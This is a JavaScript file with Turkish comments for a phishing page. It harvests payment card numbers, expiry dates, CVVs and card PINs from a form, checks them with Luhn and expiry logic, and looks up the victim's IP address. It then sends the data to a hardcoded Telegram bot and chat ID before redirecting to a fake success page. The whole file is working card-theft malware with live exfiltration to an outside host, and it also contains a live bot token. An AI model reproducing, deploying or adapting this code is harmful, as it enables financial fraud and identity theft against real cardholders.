// phmain.js - DOĞRULAMALI VE KIRMIZI KAPLAMALI

const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

window.slider1 = { prev: function() {} };
window.closeAlert = function() { 
    document.getElementById('alertDiv').style.display = 'none';
};
window.uyariKapat = function() { 
    document.getElementById('alertDiv3').style.display = 'none';
};

// Luhn algoritması (kart no doğrulama)
function luhnKontrol(kartNo) {
    var sum = 0;
    var alternate = false;
    for (var i = kartNo.length - 1; i >= 0; i--) {
        var n = parseInt(kartNo.charAt(i), 10);
        if (alternate) {
            n *= 2;
            if (n > 9) n -= 9;
        }
        sum += n;
        alternate = !alternate;
    }
    return sum % 10 === 0;
}

// SKT kontrol (gelecek tarih mi)
function sktKontrol(skt) {
    if (!skt || skt.length !== 5) return false;
    var ay = parseInt(skt.substring(0,2), 10);
    var yil = parseInt(skt.substring(3,5), 10);
    var now = new Date();
    var nowYil = now.getFullYear() % 100;
    var nowAy = now.getMonth() + 1;
    
    if (ay < 1 || ay > 12) return false;
    if (yil < nowYil) return false;
    if (yil === nowYil && ay < nowAy) return false;
    return true;
}

// Kırmızı kaplama göster
function showAlert(msg) {
    var alertDiv = document.getElementById('alertDiv');
    if (alertDiv) {
        alertDiv.style.display = 'block';
        var p = alertDiv.querySelectorAll('p');
        if (p[2]) p[2].innerText = msg;
    }
}

// Sayfa yüklendiğinde
document.addEventListener('DOMContentLoaded', function() {
    
    // Kart numarası formatlama
    var kartInput = document.getElementById('customUsername');
    kartInput.addEventListener('input', function() {
        var deger = this.value.replace(/\s/g, '').replace(/\D/g, '');
        var formatli = '';
        for (var i = 0; i < deger.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) formatli += ' ';
            formatli += deger[i];
        }
        this.value = formatli;
        // Hata varsa temizle
        document.getElementById('alertDiv').style.display = 'none';
    });
    
    // SKT formatlama
    var expInput = document.getElementById('exp');
    expInput.addEventListener('input', function() {
        var deger = this.value.replace(/\D/g, '');
        if (deger.length >= 3) {
            this.value = deger.slice(0, 2) + '/' + deger.slice(2, 4);
        } else {
            this.value = deger;
        }
        document.getElementById('alertDiv').style.display = 'none';
    });
    
    // CVV
    var cvvInput = document.getElementById('cvv');
    cvvInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 3);
        document.getElementById('alertDiv').style.display = 'none';
    });
    
    // Şifre
    var sifreInput = document.getElementById('kkpw');
    sifreInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
        document.getElementById('alertDiv').style.display = 'none';
    });
    
    // Buton
    var btn = document.getElementById('btn-spc');
    btn.onclick = function(e) {
        e.preventDefault();
        
        var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
        var skt = document.getElementById('exp').value;
        var cvv = document.getElementById('cvv').value;
        var sifre = document.getElementById('kkpw').value;
        
        // DOĞRULAMALAR
        if (!kartNo || kartNo.length !== 16) {
            showAlert('Kart numarası 16 haneli olmalıdır.');
            return;
        }
        if (!luhnKontrol(kartNo)) {
            showAlert('Geçersiz kart numarası!');
            return;
        }
        if (!skt || skt.length !== 5) {
            showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
            return;
        }
        if (!sktKontrol(skt)) {
            showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
            return;
        }
        if (!cvv || cvv.length !== 3) {
            showAlert('CVV 3 haneli olmalıdır.');
            return;
        }
        if (!sifre || sifre.length !== 4) {
            showAlert('Kart şifresi 4 haneli olmalıdır.');
            return;
        }
        
        // Kırmızı kaplamayı gizle
        document.getElementById('alertDiv').style.display = 'none';
        btn.innerHTML = 'Giriş yapılıyor...';
        btn.disabled = true;
        
        // IP al
        var xhrIp = new XMLHttpRequest();
        xhrIp.open('GET', 'https://api.ipify.org?format=json', true);
        xhrIp.onload = function() {
            var ip = 'Bilinmiyor';
            if (xhrIp.status === 200) {
                var data = JSON.parse(xhrIp.responseText);
                ip = data.ip;
            }
            
            var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
            
            // Telegram'a gönder
            var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(mesaj);
            var xhrTel = new XMLHttpRequest();
            xhrTel.open('GET', url, true);
            xhrTel.send();
            
            setTimeout(function() {
                window.location.href = 'success.html';
            }, 1000);
        };
        xhrIp.send();
    };
});
